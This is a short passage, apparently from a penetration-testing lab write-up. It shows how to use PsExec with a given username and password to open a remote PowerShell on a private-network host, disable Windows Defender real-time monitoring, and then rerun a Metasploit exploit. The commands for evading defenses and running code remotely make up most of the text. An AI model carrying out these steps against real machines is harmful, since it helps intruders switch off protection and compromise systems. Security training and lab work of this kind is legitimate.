### 4.3 Using PsExec to stop the Anti-Virus

To get around the the previous issue, one great way to get around the anti-virus deleting the payload is to use **PsExec** from a windows machine

from a windows machine run this command
> Open PowerShell and change directory to where the PsExec tool is 
>> Logon and password used in this case ***A.George*** / ***ethylene***

- Run the following
```powershell
# Go to Directory
cd \to\file\location

#run PsExec with cmd and powershell
.\PsExec.exe \\192.168.10.1 -u A.George powershell

# When prompted
Password: ethylene 

# To Disable Anti-Virus
C:\Windows\system32> Set-MpPreference -DisableRealtimeMonitoring $true
```


- Back in **msfconsole** run the exploit command again
